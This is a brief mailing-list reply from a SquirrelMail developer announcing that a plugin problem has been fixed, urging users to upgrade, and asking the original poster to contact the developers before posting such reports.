All,

   Replying to this thread using the web interface didn't seem to work 
at all, so...  Please excuse me effectively starting the thread over, 
but wanted to make sure a follow-up got posted to the list.  See:

   This problem (and several others that were really needing to be 
fixed) has been resolved and a new version of this plugin is available 
at the link below.  Obviously, it is highly recommended that anyone 
using this plugin upgrade immediately.

   Matias, next time please contact the plugin authors, any of the 
SquirrelMail mailing lists, SquirrelMail IRC, or other SquirrelMail 
developers before posting.

Thanks,

   Paul
